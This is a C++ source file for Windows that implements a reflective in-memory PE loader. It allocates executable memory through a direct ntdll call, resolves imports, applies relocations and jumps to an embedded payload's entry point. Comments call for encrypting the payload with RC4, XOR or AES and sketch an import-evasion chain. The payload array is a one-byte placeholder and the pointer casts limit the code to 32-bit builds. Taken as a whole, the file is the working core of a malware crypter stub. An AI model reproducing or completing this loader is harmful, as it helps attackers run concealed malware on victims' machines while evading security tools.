#include <Windows.h>

static HANDLE MyGetCurrentProcess() {
    return (HANDLE)(LONG_PTR)-1;
}
void* MyMemcpy(void* dest, const void* src, size_t count) {
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (count--) *d++ = *s++;
    return dest;
}
size_t MyStrlen(const char* str) {
    size_t len = 0;
    while (str[len]) len++;
    return len;
}
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);
pNtAllocateVirtualMemory NtAllocateVirtualMemory = nullptr;
void* MyVirtualAlloc(void* base, size_t size, DWORD allocationType, DWORD protect) {
    if (!NtAllocateVirtualMemory) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    }
    void* addr = base;
    SIZE_T sz = size;
    NTSTATUS status = NtAllocateVirtualMemory(MyGetCurrentProcess(), &addr, 0, &sz, allocationType, protect);
    if (status != 0) return NULL;
    return addr;
}
typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType);
pNtFreeVirtualMemory NtFreeVirtualMemory = NULL;
void MyVirtualFree(void* baseAddress, size_t size, DWORD freeType) {
    if (!NtFreeVirtualMemory) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProcAddress(ntdll, "NtFreeVirtualMemory");
    }
    void* addr = baseAddress;
    SIZE_T sz = size;
    NTSTATUS status = NtFreeVirtualMemory(MyGetCurrentProcess(), &addr, &sz, freeType);
}

int CopyImports(IMAGE_IMPORT_DESCRIPTOR* imp_desc, void* load_address)
{
    while (imp_desc->Name || imp_desc->TimeDateStamp) {
        IMAGE_THUNK_DATA* name_table, * address_table, * thunk;
        char* dll_name = (char*)load_address + imp_desc->Name;
        HMODULE module = LoadLibraryA(dll_name);
        if (!module) {
            return 0;
        }
        name_table = (IMAGE_THUNK_DATA*)((char*)load_address + imp_desc->OriginalFirstThunk);
        address_table = (IMAGE_THUNK_DATA*)((char*)load_address + imp_desc->FirstThunk);
        thunk = name_table == load_address ? address_table : name_table;
        if (thunk == load_address)
            return 0;
        while (thunk->u1.AddressOfData) {
            char* func_name;
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                func_name = (char*)(thunk->u1.Ordinal & 0xffff);
            else
                func_name = ((IMAGE_IMPORT_BY_NAME*)((char*)load_address + thunk->u1.AddressOfData))->Name;
            address_table->u1.Function = (DWORD)GetProcAddress(module, func_name);
            thunk++;
            address_table++;
        }
        imp_desc++;
    }
    return 1;
}

void* MapModuleInMemory(void* rawData)
{
    IMAGE_DOS_HEADER* DosHeader = (IMAGE_DOS_HEADER*)rawData;
    IMAGE_NT_HEADERS* NtHeader = (IMAGE_NT_HEADERS*)((char*)rawData + DosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY* reloc_entry = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!reloc_entry->VirtualAddress || !reloc_entry->Size)
        return NULL;
    LPVOID outputImage = MyVirtualAlloc(NULL, NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!outputImage)
        return NULL;
    IMAGE_SECTION_HEADER* SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
    size_t HeadersSize = (char*)(SectionHeader + NtHeader->FileHeader.NumberOfSections) - (char*)rawData;
    MyMemcpy(outputImage, rawData, HeadersSize);
    for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
        MyMemcpy((char*)outputImage + SectionHeader[i].VirtualAddress,
            (char*)rawData + SectionHeader[i].PointerToRawData,
            SectionHeader[i].SizeOfRawData);
    IMAGE_DATA_DIRECTORY* imp_entry = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR* ImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((char*)outputImage + imp_entry->VirtualAddress);
    if (!CopyImports(ImportDesc, outputImage)) {
        MyVirtualFree(outputImage, 0, MEM_RELEASE);
        return NULL;
    }
    IMAGE_BASE_RELOCATION* BaseRelocation = (IMAGE_BASE_RELOCATION*)((char*)outputImage + reloc_entry->VirtualAddress);
    IMAGE_BASE_RELOCATION* CurReloc = BaseRelocation, * reloc_end;
    DWORD DeltaImageBase = (DWORD)outputImage - NtHeader->OptionalHeader.ImageBase;
    reloc_end = (IMAGE_BASE_RELOCATION*)((char*)BaseRelocation + reloc_entry->Size);
    while (CurReloc < reloc_end && CurReloc->VirtualAddress) {
        int count = (CurReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* CurEntry = (WORD*)(CurReloc + 1);
        void* PageVa = (void*)((char*)outputImage + CurReloc->VirtualAddress);

        while (count--) {
            if ((*CurEntry) >> 12 == IMAGE_REL_BASED_HIGHLOW)
                *(DWORD*)((char*)PageVa + (*CurEntry & 0x0fff)) += DeltaImageBase;
            CurEntry++;
        }
        CurReloc = (IMAGE_BASE_RELOCATION*)((char*)CurReloc + CurReloc->SizeOfBlock);
    }

    return (void*)((char*)outputImage + NtHeader->OptionalHeader.AddressOfEntryPoint);
}

VOID WINAPI Entry(VOID) {
    // Need encryption for ex., rc4 + xor, xor aes
    // 
    // Import table kernel32.dll > LoadLibraryA > GetProcAddr > GetModuleHandle
    BYTE payload[] = { 0xa };
    void* OEP = MapModuleInMemory(payload);
    ((void(*)())OEP)();
}